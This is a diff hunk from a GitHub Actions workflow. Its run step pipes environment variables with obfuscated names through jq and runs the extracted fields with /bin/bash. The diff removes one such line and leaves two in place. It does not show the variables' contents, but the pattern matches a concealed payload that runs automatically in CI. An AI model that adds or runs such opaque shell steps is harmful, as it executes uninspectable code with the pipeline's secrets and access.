@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$rn6" | jq -r .h443 | /bin/bash
           printf '%s' "$ga661" | jq -r .ltzh6 | /bin/bash
-          echo $pqhsj164 | jq -r .aeudl1661 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
